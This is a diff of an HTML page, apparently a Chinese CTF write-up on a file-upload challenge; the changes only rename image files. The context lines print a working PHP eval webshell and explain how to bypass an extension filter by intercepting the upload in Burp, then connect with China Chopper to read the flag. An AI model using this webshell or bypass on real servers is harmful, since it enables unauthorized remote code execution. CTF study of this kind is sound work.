@@ -363,14 +363,14 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'bitsec'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>然后将文件后缀改为jpg，然后设置代理，通过burp进行抓包，如图</p>
-<p><img src="./upload1-1.PNG" alt="upload1"></p>
+<p><img src="./upload11.PNG" alt="upload1"></p>
 <p>将其中的后缀改为php，然后forward即可上传成功，如图。</p>
-<p><img src="./upload1-2.PNG" alt="upload1"></p>
+<p><img src="./upload12.PNG" alt="upload1"></p>
 <p>页面回显：upload success : upload/1573961293.123.php </p>
 <p>通过中国菜刀等webshell工具连接成功，如图：</p>
-<p><img src="./upload1-3.PNG" alt="upload1"></p>
+<p><img src="./upload13.PNG" alt="upload1"></p>
 <p>访问目录，发现flag.php文件，打开就得到flag：</p>
-<p><img src="./upload1-4.PNG" alt="upload1"></p>
+<p><img src="./upload14.PNG" alt="upload1"></p>
 
           
         
